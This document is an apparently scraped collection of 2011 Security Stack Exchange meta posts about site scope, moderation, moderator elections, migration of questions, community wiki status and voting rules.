<p>Specifically, <a href=""https://www.owasp.org/index.php/OWASP_Israel_2011"" rel=""nofollow noreferrer"">this conference</a> (unlike most of the other AppSec conferences) is completely free to attend, and is totally covered by sponsorships. We are expecting several hundred to attend.  </p>

<p>There are <a href=""https://www.owasp.org/index.php/Membership"" rel=""nofollow noreferrer"">several options for sponsoring</a>:   </p>

<ul>
<li>Conference sponsor at several levels - Gold/Silver/etc (i.e. Chapter Sponsor)</li>
<li>project sponsor for any OWASP project that SEI likes (like SO has done in the past for opensource projects...), such as <a href=""https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API"" rel=""nofollow noreferrer"">ESAPI</a>; </li>
<li>OWASP member / Organization sponsor</li>
<li>any mix of the above (can become full member, and designate part of the meembership fee to sponsor a specific chapter or project).   </li>
</ul>

<p>Specifically, my particular interest right now is <a href=""https://www.owasp.org/index.php/OWASP_Israel_2011"" rel=""nofollow noreferrer"">sponsorship for the conference</a>, as we are still looking to cover costs - it's important to us to keep this conference free.

<p>IE 7.0 doesn't show the links available in the  tag with the id ""top bar"".  Other parts of the page are fine, it's just the text in this bar.  And it only happens <em>after</em> login - it was fine with an unlogged in user.</p>

<p>So it sounds like these days it is intended to be a group process.</p>

<p>As for the bigger issue, my first question is which do we want - law or legal. It seems like we'd want a discussion before a huge amount of retagging....</p>

<ul>
<li>What were the stats on them before you started retagging?</li>
<li>What do other SE's use?</li>
<li>Are there any tools to help us decide?</li>
</ul>

<p>But assuming for the moment that we do agree that law should be a synonym for legal (and I actually do agree), then I can confirm that I get the same error you do when proposing that, and that seems like a misfeature for sure.</p>

<p><strong>Update</strong>: According to the popups I get while choosing a tag at <a href=""http://stackexchange.com/filters/17212/my-filter"">http://stackexchange.com/filters/17212/my-filter</a>, legal has 1258 hits on SE, while law has 176.  And @rebecca-chernoff says that the way to deal with the current situation is to down-vote the current proposal to make legal a synonym for law (at <a href=""https://security.stackexchange.com/tags/law/synonyms"">https://security.stackexchange.com/tags/law/synonyms</a>, oddly enough, not at the legal tag) to -2 so it goes away and we can (try again to) propose ""law"" as a synonym for ""legal"".  Unfortunately even though we are out of beta, few people have enough rep to do so - look at <a href=""https://security.stackexchange.com/tags/legal/topusers"">https://security.stackexchange.com/tags/legal/topusers</a> (or is it topusers for law??) to see if you qualify.  And I don't know how to interpret that page either, there are two columns of numbers - what do they mean?....  And since law has already mostly been retagged as legal, it may be impossible to find anyone who has the rep to vote.  So again I conclude that this is broken, and we rely again on mods to do all this.  Or at least it is insecure, since lots of people can edit tags, and edit themselves into a position to vote on something that they've demonstrated no knowledge of.....</p>

TBH part of what tipped the scaled for me (towards undecided, and away from closing outright), was the excellent answers already received there, before I viewed the post. Closing it outright would be unfair to those fantastic posts (though, as @D.W. commented there, the question itself is unfair to the posters).  </p>

<p>Btw, there was quite some discussion on this very issue, over at the <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">DMZ (IT Security Chatroom)</a>. That is one way to gather consensus, and understand via discussion the different issues at hand.<br>
Feel free to jump in!</p>

<p>P.S. I also want to point you at <a href=""http://blog.stackoverflow.com/2009/05/a-theory-of-moderation/"" rel=""nofollow"">this blogpost from @JeffA</a>, while this pertains to all of SE, we do also try to follow those guidelines. </p>

  <p>What is the general attitude of this site's moderators? </p>
</blockquote>

<p>From my observation they tend to be relaxed, but it depends on the individual. Some on them want sharks with frick'n lazers.</p>

<blockquote>
  <p>Pro-active, or waiting for the community to flag a poor post?</p>
</blockquote>

<p>Again from my observation, unless a post of extremely poor, they the order of operations is aproximatly: comment, chat, edit, close.</p>

<blockquote>
  <p>Does that mean the question is de-facto acceptable, given that a moderator looked at the question, and didn't close/delete it? </p>
</blockquote>

<p>Different moderators have different opinions, so I guess the only thing you can say is it is acceptable to that moderator.</p>

<blockquote>
  <p>Or do moderators wait for more input from the community?</p>
</blockquote>

<p>I think they do. It appears that if there is some way to salvage the question they work towards that. Sometimes they wait to see comments or answers from the community before proceeding.</p>

<p>I think this particular post highlights a somewhat different question: how to deal with the kind of question cited - i.e. a relatively basic question, or one that is very ambiguous and thus frustrating to answer.</p>

<p>We have a few choices:</p>

<ul>
<li>Close them</li>
<li>Comment on them in an effort to get the original poster to improve them</li>
<li>Edit them into a better form</li>
</ul>

<p>Also, note that it is sometimes a race between folks trying to make the questions better, and other folks looking to quickly provide an answer to their interpretation of the question, perhaps trying to get some reputation built up.</p>

<p>In this particular case, my view was that we didn't have a question on that particular basic point of crypto, and since we have people willing to give good answers to such questions, it isn't a problem for us to have them, even if Wikipedia also has good content on the same topic.  So my preference was to edit it to make at least the title read well and lead people to good answers.  This is not always easy, especially if the answers are already all over the place, and it runs the risk of changing the game for those who have already answered.  But I take the view that this is all Creative Commons Share-and-Share-Alike, and my goal is a site that helps people learn while respecting people's contributions.  Not always easy, but as Jeff and Wikipedia say, ""Be Bold"".  The author (and many others) can always revert a change.</p>

<p>I think this site should expand to cover <strong>all questions germane to security professionals</strong>. This includes IT systems, software applications, building , locksmithing, accounting procedures, and any similar topic, as long as the question is intrinsically about security. “Professionals” means that this is a place primarily intended for people whose job is about security; nothing prevents amateurs from posting, but the onus is on them to rise to the professionals' level.</p>

<p>In other words, I am pushing to change the first sentence in the <a href=""https://security.stackexchange.com/faq#questions"">FAQ</a> to</p>

<blockquote>
  <p>Security - Stack Exchange is for security professionals to discuss protecting assets from threats and vulnerabilities.</p>

<p>Or, to put it in a different way: <em>if it's good enough for <a href=""http://www.schneier.com/"" rel=""nofollow noreferrer"">Bruce Schneier</a>, it's good enough for <a href=""https://security.stackexchange.com/"">Security Stack Exchange</a></em>. (I'm willing to compromise on squids.)</p>

<hr>

<p>There have been precedents, of broadening the scope of a Stack Exchange site during the beta period. <a href=""https://scifi.stackexchange.com/"">Science fiction</a> broadened to Science fiction and Fantasy after about a month in beta, with general agreement (more details upon request). <a href=""http://audio.stackexchange.com/"" rel=""nofollow noreferrer"">Audio Recording and Production</a> broadened to Audio-Video Production (I don't know the details). Changing now, after launch, is a bit late, but not impossible. I'm not concerned so much with the existing IT security community, but with physical security and other communities who might have a difficult start on an existing site. This is a surmountable difficulty, in my mind a much lesser evil than not having direct contact between IT security and other security fields.</p>

This makes me worry on two things about the scope broadening.</p>

<ol>
<li><p>We shall change our identity, from ""IT Security"" to ""Security""</p>

<ul>
<li>Does this mean we shall drop all the work done? Design, communications, ...</li>
<li>What does change of identity means for us right now? I mean we had one year of beta and we did not include physical security. Why now? Does it mean we did not work our scope well enough? That may impact the image of the site badly. Take care!</li>
</ul></li>
<li><p>How will the community react to it.</p>

<ul>
<li>People here may not be ready to support an expanded scope such as what @Gilles is porposing. We do not want question to be left unanswered because of lack of expertise. Unfortunately I understand that beta(s) on physical security already failed. That is also a major issue in scope broadening with regard to the current statement.</li>
<li>Would this scare existing users? We can't possibly begin to push ""beta-like"" question right in the question list of [security.se]. We need to separate the ""beta"" process, from the already launched site.</li>
</ul></li>
</ol>

<p>With this in mind, it triggers an idea. But it may be a bit early to do that because we have to take care of ourselves in this first year of independence. Though, would it be possible to babysit a proposition within our garden? I mean some thing that would be like a three way StackExchange site: InfoSec / Sec / Meta. It may require a bit of work from devs I guess, but we may enrich the Area51 staging place with a new system. This would be a way to push smaller proposition, that did not fit [all] the beta critters, into existing sites, with merging objective. In this context, requirements for visit/day, high-rep user ratio or question per-day ratio can be ignored or reduced, because of the mother-site influence.
Reputation would be shared across mother-site and baby-site, giving it the power of the community management from ITSec and reward new-comers with reputation for ITSec when participating in the baby-site.</p>

<p>At the end, if the experience is successful enough, merging - rescoping - renaming etc would be possible. In case of failure, people from the baby site would just be part of the main site, and the proposition dropped.</p>

469,2,2011-08-04T20:34:57.203,4,,"<p>The site already covers the topics you ask about since they are all related to IT security.  In particular it covers many aspects of physical security.  Covering physical security is critical to IT security - how do you protect servers, laptops, disks, remote backups, transit etc without physical control over them?  How do you get physical control without good knowledge of locks, id procedures, etc?  And has been discussed before, all this holds together because the same ""cat-and-mouse"" mindset is critical to these various security questions.</p>

Physical questions were happily asked, tagged and answered during beta.</p>

<p>The aspects which this site presumably doesn't cover (e.g. political rants about the TSA, personal questions about martial arts training and weapons, etc.) are generally not covered because of our focus on being professional and rooted in IT matters, not because we don't do physical security.</p>

494,1,2011-08-18T08:44:37.170,15,270,"<p>I've noticed a number of questions that have been migrated from, say, Stack Overflow.SE to Security.SE -- where the migration has occurred after the question already accumulated a number of erroneous answers with many upvotes.</p>

<p>This is a problem, because IT Security has many fewer voting members than Stack Overflow.  This makes it infeasible to clean up all the errors in the answers that got migrated along with the question: even if every IT Security member downvoted the erroneous answers, we'd still be outnumbered by the Stack Overflow votes.  The theory of a SE site like IT Security is that the users of IT Security.SE are likely to be, on aggregate, knowledgeable about security, so votes from these users are likely to be a good way to capture the best knowledge about security. Unfortunately, this theory falls apart when most of the votes on a given answer are not from IT Security users, but have been carried over from some other community as part of a migration.</p>

<p>This problem occurs because Stack Overflow has so many more users than IT Security.  It's not unusual for answers on Stack Overflow to get 25-50 upvotes, sometimes even more.  In contrast, it's very rare to see even fantastic, stellar answers on this site get more than 10-15 upvotes.  This means that, when questions are migrated from Stack Overflow after they already contain some answers, Stack Overflow's voting community is going to vastly outweigh the views of IT Security.  Unfortunately, when questions are about security, Stack Overflow voters don't always have the security expertise that IT Security has.</p>

<p>I've noticed that this seems to degrade the trustworthiness of information on the IT Security site, for questions that have been migrated from high-volume sites like Stack Overflow.  This is unfortunate: it would be nice if the IT Security community could take ownership and responsibility for the quality of answers on its site, but the way migration currently works interferes with that.</p>

<p>Don't get me wrong.  We've gotten some great questions this way, and some of the answers that are migrated are quite good, too.  Also, there's a possibility that migrated questions might attract new folks to come participate at IT Security.  So there are lots of positive benefits to migrating these kinds of questions, and on the whole I expect it is a positive thing.  But there are also some issues that seem to recur.</p>

<p>Does anyone have any ideas for ways to mitigate this systematic issue with questions migrated from high-volume sites over to us?</p>

<p><strong>Edit (9/18):</strong> I was asked for examples.  Here are a few:</p>

<ul>
<li><p><a href=""https://security.stackexchange.com/q/5534/971"">Is it OK to tell your password to an admin? [closed]</a> - Migrated from Superuser, already had incorrect answers with dozens of upvotes.  See @AviD's answer for the full details on this one.</p></li>
<li><p><a href=""https://security.stackexchange.com/q/6272/971"">How can I avoid my password being harvested by key loggers from internet cafes?</a> - Many problematic answers here.  The highest-ranked answer  recommends insecure practice (one-time passwords).  The second-highest ranked is wrong and insecure.  The third highest-ranked is wrong and insecure.  The best answer has only 4 votes, compared to 26 votes for the top-ranked answer.  Many low-quality/incorrect/confused comments (no way to downvote them).</p></li>
<li><p><a href=""https://security.stackexchange.com/q/5447/971"">How secure is a Windows password protected zip file?</a> - The top two highest-ranked answers are flawed.</p></li>
<li><p><a href=""https://security.stackexchange.com/q/5734/971"">Is Steganography a safe method to store secret data?</a> - The highest-ranked answer is incorrect.  Many low-quality/incorrect/confused comments (no way to downvote them).</p></li>
<li><p><a href=""https://security.stackexchange.com/q/5586/971"">Why do people think that this is bad way to hash passwords?</a> - The highest-two ranked answers are fine.  Some of the other answers are not good.  Many low-quality/incorrect/confused comments, even including some of the comments with many votes (no way to downvote them).</p></li>
<li><p><a href=""https://crypto.stackexchange.com/q/436/351"">Now that quantum computers have been out for a while, has RSA been cracked?</a> (Crypto.SE) - At the moment, the two highest-ranked answers are pretty confused.  The best answers have only 0 or 1 votes at the moment.  This was migrated only yesterday, so may be in flux (but I can't imagine Crypto.SE having enough users to downvote the poor answers or upvote the good ones past the poor ones).</p></li>
<li><p><a href=""https://crypto.stackexchange.com/q/361/351"">Is something wrong with this algorithm in terms of security?</a> (Crypto.SE) - This one is less problematic. Many answers are fine.  However, it is cluttered with many low-quality/incorrect/confused comments (no way to downvote them).</p></li>
</ul>

<p>(This list is undoubtedly non-exhaustive. I couldn't find a way to use the search tool to find all questions that have been migrated to Security.SE, and I haven't been keeping a list of these questions.  But this is probably reasonably representative.)</p>

<p>However, there are also many examples where migration has worked out fine (which I've omitted), and I realize in the grand scheme of things a half a dozen problematic questions may not be a big deal.  And, @AviD makes a reasonable point that this has been an issue even for some non-migrated questions: e.g., <a href=""https://security.stackexchange.com/q/6095/971"">XKCD #936: Short complex password, or long dictionary passphrase?</a> attracted a lot of non-standard IT Security users, and the top-ranked answer is flawed (sorry, @Jeff, but it is), and there are many other low-quality/incorrect/confused answers and comments, even some with many votes -- so as @AviD correctly argues, this is not limited to migrated questions.</p>

<p>The most likely questions would be:</p>

<blockquote>
  <p>""What binary translation tools are available for Microsoft Windows?""</p>
</blockquote>

<p>This type of question is not necessarily security related as you can use binary translation tools for lots of purposes. IT Security moderators have tended to close or migrate questions that are requests for resources that are not necessarily security related.</p>

<p>I think a different version of the question:</p>

<blockquote>
  <p>""What binary translation tools are available for Microsoft Windows that are efficient for virus analysis and are effective at preventing viruses from harming the host system ?""</p>

<blockquote>

</blockquote>

<p>but </p>

<blockquote>
  <p>Would an IT Security professional know or want to know X significantly more than, or to the exclusion of other types of professionals.?</p>
</blockquote>

<p>IT Security profesionals perform a lot of job related activities that are not security activities: fill out time cards, backup their computers, read about trends in computing, etc.</p>

<p>However IT Security profesionals perform some activities that other professionals  rarely or never do: internal threat analysis, threat mitigation strategy formulation, user IT security training, user security awarness campaigns, forensic data analysis, expert witness for computer crime trials, vulnerability analysis, password policy formulation, compromise recovery, penetration testing, etc.</p>

<p>The context matters little. If the question out of context is not obviously security related, then it may be simply IT related.</p>

<p>Asking how to get a particular piece of software to run on a particular computer system is assumed to be an IT problem (SuperUser or ServerFault) unless a security component makes it unlikely that an IT profesional would know the answer. For example the software is used exclusively for forensic analysis as evidence in a legal matter. </p>

I also posted some answers.</p>

<p>My question was changed to a community wiki, and also changed all of my answers to a community wiki, without asking me.  When I asked why, the reason given was <em>""this is an ""infinite list of X"" and as such has to be community wiki, otherwise it should be deleted outright.""</em>  The question and my answers remain converted to community wiki status, against my wishes.</p>

<p>Can I ask Security.SE moderators to re-consider this decision?  Would it be possible to return this question and the answers back to ordinary status, with the community wiki flag removed?  I do not think it benefits the site to force this question and all answers to a community wiki, in this situation.  Contrary to how it has been marked, I'm not requesting or inviting others to edit my question or my answers; I think my questions and answers are fine as is.  I believe my question and the answers are relevant and useful to have on this site and its users.</p>

<p>The justification given didn't resonate with me.  The Stack Exchange software already handles questions that have multiple valid answers, without a need for community wiki status.  I don't see why this situation requires others to be able to edit my question, or to edit my answers.</p>

<p>I've read the documentation on community wiki status, and I have not been able to find any documentation which says that if a question calls for multiple answers, then the question or the answers should be marked as community wiki.</p>

<ul>
<li><p><a href=""https://security.meta.stackexchange.com/q/47/971"">How and when should we use the Community Wiki feature?</a> says nothing about this.  In fact, it says questions should not be marked community wiki (contrary to how my question was treated).  And it doesn't discuss any basis for forcibly converting questions or answers to community wiki, against the wishes of the author.</p></li>
<li><p><a href=""https://meta.stackexchange.com/q/11740/160917"">What are ""Community Wiki"" posts?</a> says nothing about ""list of X"" questions or reasons why a moderator might change a question and answers to community wiki against the author's wishes.</p></li>
<li><p><a href=""https://meta.stackexchange.com/q/7157/160917"">What types of questions or answers should be made community wiki?</a> does not support this decision.  The only situation it lists where a question would be forcibly marked community wiki is where the question is subjective or does not have a right answer.  The answers to my question are not subjective and answers are either right or wrong, so that doesn't apply.</p></li>
<li><p>On <a href=""https://meta.stackexchange.com/q/55888/160917"">When to mark the 'community wiki' checkbox on a new question?</a>, one highly-voted answer says ""A question should not be marked CW if it is possible to write valid, helpful and knowledgeable answers which contribute to SO.""  Under this criteria, I think my question should not be marked community wiki.  Another answer says ""a question's having more than one answer is not a reason for the questioner to make it CW"", which also seems to apply here.</p></li>
<li><p><a href=""https://meta.stackexchange.com/q/57226/160917"">Should we have a ""List of X"" close reason?</a> criticizes ""List of X"" questions on the basis that they tend to be polls and copy-pasted content.  That criticism does not apply to my question.</p></li>
</ul>

<p>Jeff Atwood that the question and all answers should either be community wiki or should be deleted.  OK, that's his call.  It's his web site, and his rules: I'll certainly abide by them.  If the decision is to retain the forced community wiki status, then please go ahead and delete the question and all answers, and I'll be sure not to ask ""List of X"" questions again; sorry if I've inadvertently violated community norms or rules.  In either case, it would be nice if the policy were documented for the future.</p>

<p><strong>Edit (9/7):</strong> I'm closing this question now.  Looks like I have received a definitive answer from @Jeff Atwood.  Thanks to Jeff for taking his time to share his thoughts and to elaborate on what he has in mind for the site!  Much appreciated.  There are all too few organizations where the leaders engage on such a detailed level with the participants; I feel privileged to have the chance to learn more about Jeff's thinking and vision for this site.</p>

<h2>Primary Phase</h2>

<blockquote>
  <p>In the <strong>primary</strong> phase, all nominees advance to preliminary community voting. Any community member with <strong>150</strong> reputation may vote in the primary.</p>
  
  <p>There is no commenting in this phase, only one up or down vote per candidate. The candidate vote scores are all public. Initial voting should provide a rough sense of which candidates are most electable.</p>
  
  <p>All candidates are displayed in <em>random</em> order.</p>
  
  <p>The primary is not binding; nominees may withdraw at their discretion at any point during the nomination phase.</p>
  
  <p>After 4 days, the top <strong>10</strong> candidates based on primary vote score proceed onward to the <strong>election</strong> phase.</p>
</blockquote>

<h2>Election Phase</h2>

<blockquote>
  <p>In the <strong>election</strong> phase, 10 candidates advance to final community voting. Any community member with <strong>150</strong> reputation may vote in the election.</p>
  
  <p>Each community member has 3 votes. Please cast your votes in order of preference, starting with the most desirable candidate first.</p>
  
  <p>All candidates are displayed in <em>random</em> order.</p>
  
  <p>The vote tallies are private until the election is complete.</p>
  
  <p>After 4 days, the final voting results will be freely downloadable from this page forever, and we will calculate the winners using <a href=""http://www.openstv.org/"" rel=""nofollow"">OpenSTV</a> with the <a href=""http://en.wikipedia.org/wiki/Meek%27s_method#Meek.27s_method"" rel=""nofollow"">Meek STV method</a>.</p>

I was initially shocked at the lack of term, because common democratic political elections have them. I generally dislike unbounded activities as they seem discordant with the physical world. On the other hand I also dislike arbitrarily determined boundaries. I realize that this will not be binding upon IT security or the community elected moderators, but I would still like to ask: </p>

<p><strong>What is an appropriate boundary for the end of a moderator’s term?</strong></p>

<p>I think an arbitrary time bound is silly, but there may be some other threshold of value. If there was some way to measure a moderator’s ability to do the job, I would think that their term should end when someone else was more able to do their job. Of course that would require a way to determine how well someone who was not a moderator could perform the moderator duties.</p>

I am one of the core developers and game-master/admin of the open source game Stendhal. The community and especially the trouble makers look for every mistake of an GM. But that is okay, it's to be expected that moderators set a good example. Yes, mistakes do happen. Admitting them openly and getting the community involved is a good approach. Moderators are not alone. Difficult situations can and should be discussed.</p>

This is evidently a serious thing, that is bringing a little fear of wrong doing. But anyway, this shall not change the basis of my behaviour. I'll still answer question to provide guidance as usual, or comment. Of course, users know well how to complain on meta (I can find dozen of example on MSO). So yes this may give us more weight in discussion and as it not been taken too lightly, but it should not make us reluctant to act.</p>

If, after a discussion, and a warning or two, then temporary bans seem to be the most reasonable next step. This is definitely a hard situation to deal with, though.</p>

At the end of the day, this is, after all, about communities, not individuals.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/1994935#1994935"">answered</a>:</strong> Well. Tough question indeed. But I think that the best thing is to inform the user about it. Chat, message are here for this. In the last resort, I suggest to discuss it with the other mods and/or with the community to find the best answer to it. We do not want to judge to quickly.</p>

Valid flags and good answers seem contradictory. I take it that this would be a case where follow-up comments were hostile / attacking... and you just very slowly ramp up the pressure... add comments that redirect, then address the user through regular channels, then admin, then increasing temp bans.... others have accurately pointed out that you need to let them know they are valuable, but they must also be civil.</p>

I really like AviD's approach. He did edit the comment to remove the offensive part while keeping the valuable part. In the end the friendly community is more important than an trouble maker even if he posts good answers. But we should try to help this person to settle in before temporary suspending an account.</p>

If the flagged comments really detract from the site, then there needs to be more intervention than if it is a case of admirable passion about an issue that happens to trigger some other folks who are overly prone to flag things.   Trying to reduce tensions and clarify this in private and if necessary in public is one step, but it all depends....</p>

Then discuss in chat. Then close, and be aware that it may be re-opened, altered, migrated or whatever. This happens a bit, especially on migrated-in questions</p>

If you get somebody like @ThomasPornin being the one who points out that it's technically wrong and you know by reputation that he is the somebody who is a master of their domain, you point that out. If it's civil, this isn't a moderator role -- it's a user role. The mods on SO aren't running around fixing technical comments on code.</p>

If the answer has at least some information which is correct, there is nothing to do, and the poster earned the reputation. However topic that shall be off-topic, or not suited to the site shall be removed. By the way, we can pinpoint the user that think answer are wrong to propose a new one or improve the existing.</p>

I see a moderator's role being that of responding to incidents and guiding the culture. In this situation, I do see it as, largely, a normal user issue to deal with. The problem, however, comes into play when you're dealing with a dangerously incorrect answer.</p>

I do, however, feel that is should be strongly guided by user flags.</p>

I think this situation can be dealt with by normal users in most cases by adding comments.</p>

There may be cases which justify moderator involvement, but those have to be looked at on a case by case basis.</p>

I wouldn't want to use my mod powers to obliterate or change the answer in case it's me that's in the wrong. I'd down vote, leaving a comment with references to explain why. I might bring it up in chat to see what everyone else thinks.</p>

That is always something I have dreaded, but in my professional life I have been targeted as committee chairman because I, apparently, am fairly level headed when it comes to dealing with those types of situations. I am more nervous about the close vote issue. I am in lust with close voting, and having a binding vote scares me a bit.</p>

But I'm not forcing it, as the community is half in favour, half against, so far:-) Plus, Lockpicking is cool!</p>

<p><strong><img src=""https://www.gravatar.com/avatar/34e5e0b41202f3c375552750c0d6f309?s=16&amp;d=identicon&amp;r=PG"" alt=""Jeff Ferland""> <a href=""http://chat.stackexchange.com/users/9882/jeff-ferland"">Jeff Ferland</a> <a href=""http://chat.stackexchange.com/transcript/message/1995788#1995788"">answered</a>:</strong> I think physical security is part of the realm of IT security. I think we would have no influence on people who implement airport security, so we can skip that. More than anything, I think if the community is overwhelmingly in favor of something, that's the way we go and as stewards who represent, the moderators shall make it so.</p>

As part of my Information Security Analyst duties, I deal with physical access controls frequently. Lockpicking is actually an On-Topic job for me. Pentesting, for example, isn't just about hacking code, but also about slipping in through the back door (so to speak).</p>

Changing the scope is not an easy thing and shall be dealt with care. Area51 is here to hatch ideas and if beta there fails, but had interesting points it may be worth welcoming thenew community. As for example, we now have a facebook site buillt over SO, and I think this can have offsrping somewhere.</p>

<p>It doesn't have to be the one with the most votes, but often the votes will give an indication as to the value of the answer. It also doesn't need to be accepted straight away - for some questions you want to leave it open to get more answers, but once answers stop coming you should accept the one you feel best answers your question.</p>

<p>If you have a low accept rate, people may not bother to answer (because the best rep earning for a single activity comes from accepted answers) so in order to encourage people to answer your question you should regularly look at your questions and accept the answer that you think best from each one. </p>

<ul>
<li>an upvote gives 10 StackExchange reputation points</li>

<p>Usually good answers are voted up several times. For example, if a answer is upvoted 5 times and accepted the author gets 50 StackExchange reputation points from upvotes and 15 StackExchange reputation points from accept for 65 points total. 15/65 is 23% which is significant. However, if an author has a lot of accepted answers for a particular tag the author's reputation (not StackExchange reputation points) as an authority on that tag is increased in a non-numeric way.  </p>

<p>Why was this question locked?  What ""disputes about its contents"" is @Shog9 referring to?  I didn't see an explanation or a thread on meta explaining this decision.</p>

<p>I'd also like to raise a concern about @Shog9 bypassing this site's community moderation process.  I thought StackExchange espoused the philosophy that they'd trust the site's community and its moderators.  I wonder whether it was really necessary to step in and bypass the Security.SE community's own processes.  For the future, I would prefer to see external StackExchange staff step in only under exceptional circumstances (which does not seem to be the case here).</p>

<p><strong>Edit 11/6:</strong> I withdraw my concerns.  The actions taken seem unobjectionable.  I think I was mostly confused by the suggestion to visit meta for more information, and the lack of explanation why the question was locked.  This can be closed, if others agree.</p>

What you can see here is an edit war - the OP clearly took exception to the community response (i.e. downvotes, various comments calling into question the scope of the question) and added a rather large section to the post to let off steam.</p>

<p>This was removed by community members and the OP repeatedly rolled back the post to include said content. To prevent this, Shog9 locked the post, which prevents anyone but a diamond (a site moderator or stack exchange employee ""carrying"" a diamond - not all do) doing anything meaningful to the question at all, including vote, edit, close, delete, undelete, answer etc. </p>

<p>Since users have most of these permissions on their own posts, locking is a last resort option which prevents even the OP from altering their own content. Stack Exchange content is contributed CC-by-SA, but once contributed you cannot revoke that license to your content and vandalising it or altering it in a way that is not constructive in the community needs to be prevented. That is what has happened here.</p>

<p>The idea is to force such discussion to resolve itself on meta whilst not allowing the post to suffer in the dispute. The OP is, therefore, welcome to wander over here and ask why their question was locked and hopefully achieve community consensus on what should be done. Clearly that discussion hasn't started yet; in this case, I think it would require the OP (or another person?) to ask why his question was, in the eyes of some, considered too broad.</p>

<p>As to why Shog9 stepped in - I don't know. Perhaps he saw the issue first? Perhaps he was checking up on our moderators/this community in general (that is his job, after all) and just saw a flag? Who knows; I don't. There is, however, nothing wrong with what he has done. He hasn't taken any action our moderators cannot undo; he has, however, prevented a problem from escalating. Shog9 has a lot of experience with this sort of stuff; he was <a href=""http://blog.stackoverflow.com/2011/03/welcome-valued-associate-josh-heyer/"">hired</a> precisely because of his contributions to SE and experienced a time before tools such as locking existed. I don't see a problem with SE staff helping out where their speedy action stops a problem dead in its tracks and encourages a community consensus, rather than the abuse of a post, or what you might see elsewhere as a derailed thread. Moderators are not all-present users and whilst there are three of them, it can happen that all three moderators are away for a time, particularly at weekends. </p>

Locking was a minimal intervention that solved the immediate issue (a poster who kept wanting to put up offensive content) while deferring long-term resolution to site moderators (who might decide to or not to close the post, contact the user, etc.).</p>

<p>We do. As both Gilles and Ninefingers have noted, the post in question was being <a href=""https://security.stackexchange.com/posts/8661/revisions"">repeatedly edited</a> by its author to consist mostly of an off-topic rant about the site itself, with one of this site's moderators stepping in twice already to revert it back to its original form. I saw it yesterday after Gilles mentioned it in chat, and decided to lock it <em>because</em>:</p>

<ul>
<li>It was clear the author had no intention of letting the matter rest</li>
<li>This particular user has had something of a history of ""defacing"" his own posts on other sites.</li>
<li>The decision of the moderators here was clearly in favor of keeping the original post intact.</li>
</ul>

<p>There's no particular reason why I <em>had</em> to step in, but I was aware of the situation, it was clear what needed to happen, doing nothing stood a decent chance of just prolonging angst, and so I acted. <em>Most</em> of the activity you'll see from SE staff will be in situations like this (other common scenarios involve spam and trolling). </p>

<p>Note that all actions by moderators <em>or</em> SE staff are visible to all other moderators (and SE staff) and therefore subject to review and possibly reversal. It's literally the first thing visible upon opening the moderator tools. Nothing is done in secret.</p>

626,1,2011-11-26T12:26:01.603,3,77,"<p>I have a complaint about the way the site works: After I've voted on an answer, the site won't let me later change my vote.  Sometimes after reading comments and discussion, I change my view of the answer, but the site won't let me change my vote.  For instance, it won't let me remove a vote that I later decide (e.g., based upon the comments) was unwarranted or misguided.  My reaction is, Huh?  Why is the site preventing me from doing that?  What is gained?  What is the purpose of this restriction?  How is this helping make the site more useful to the world?</p>

<p>My feature request is: remove this restriction, and let me change my vote at any time after it is initially cast.  Or, if that is considered unacceptable for some reason, let me change my vote if there has been at least one new comment (by someone other than me) since the time that I cast my vote.  Or, if that is unacceptable, then let users with at least 2K reputation change their vote (why 2K? because there's currently a hack-ish way 2K-rep users can circumvent the restriction, if they choose, as discussed below, so this change would not open up any new opportunities for gaming).</p>

<p>This sort of request has been <a href=""https://meta.stackexchange.com/q/19940/160917"">widely supported at SO.Meta</a>, but has not been acted on.  (See also: <a href=""https://meta.stackexchange.com/q/32266/160917"">1</a>, <a href=""https://meta.stackexchange.com/q/19021/160917"">2</a>, <a href=""https://meta.stackexchange.com/q/19021/160917"">3</a>.)  Apparently this restriction was designed to prevent ""gaming"", but I think it goes overboard in preventing useful behavior.  (I don't think ""gaming"" has been a problem here on ITSecurity, but for those who are concerned about ""gaming"", see my suggestions above for ways to allow vote changes without introducing gaming.)  Moreover, I think there is an argument that ability to change your vote is especially appropriate on ITSecurity: security is subtle, and it is not unusual that someone posts an answer that looks good/bad, and then an insightful comment makes you realize your initial impression was inaccurate.</p>

<p>P.S. I know that I can make a no-op edit to the answer and then change my vote, but that's just silly.  It is silly to have to go to those artificial contortions.  It also compromises the anonymity of the voter and is only available to those with 2K reputation, of which we have only 28 at the moment.  The fact that I can circumvent the policy using the ""no-edit edit"" workaround suggests that the policy is not actually preventing the behavior it is supposedly prohibits, which further suggests to me that it should be re-thought.</p>

627,2,2011-11-28T18:30:49.613,5,,"<p>It <em>seems</em> that at an early point in the history of StackOverflow, they got bitten by several wide-scale ""gaming"" attempts which involved downvoting and then subsequent undoing of said downvotes. The SO people are not very eager to give details... My guess is the following: <em>within the database structure</em>, there is no tracking for undos: an undone vote is as if the vote had never occurred. However, the SO people react to gaming attacks by running fraud-detection scripts, which look for ""suspicious patterns"". What these scripts do is not public information, because it would presumably make it too easy to fl under the radar (that's security through obscurity at its finest). So they deactivated vote-undoing (beyond the 5-minute window) because they need modification history to do their magic detection thing, and undoing erases history except when it is part of an edit (and I am quite ready to believe that retrofitting vote-undoing-tracking to their system could be a daunting task).</p>

<p>To sum up, I think that the impossibility to undo votes is here to stay, because removing it would prevent some fraud-detection scripts to work, or would imply adding some non-trivial features into the SO engine. <em>And</em> you will probably never get such a straight answer (or even a comprehensive description of what really is ""tactical downvoting"") from the SO team (except the generic ""it is for security"") because of the perceived need for obscurity.</p>

<p>Designing a voting system which is resilient to tactical downvoting and yet does not rely on obscurity looks like an interesting question. It is part game theory, part psychology, and it would be on-topic on security.SE.</p>

629,2,2011-11-30T04:38:06.757,2,,"<p><strong>My view.</strong> My suggested criteria for migration is that the question is on-topic here, and will get better responses here, and has not already received a non-negligible number of answers or votes.</p>

